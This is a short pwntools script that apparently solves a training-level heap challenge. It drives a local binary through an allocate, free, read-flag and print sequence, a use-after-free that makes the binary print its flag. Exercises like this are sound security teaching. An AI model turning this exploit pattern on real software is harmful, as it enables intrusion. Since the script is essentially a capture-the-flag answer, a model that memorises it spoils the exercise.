from pwn import *
r = process("./level1.1")
r.read()
r.sendline("malloc")
r.sendline("247")
r.sendline("free")
r.sendline("read_flag")
r.sendline("puts")
r.interactive()
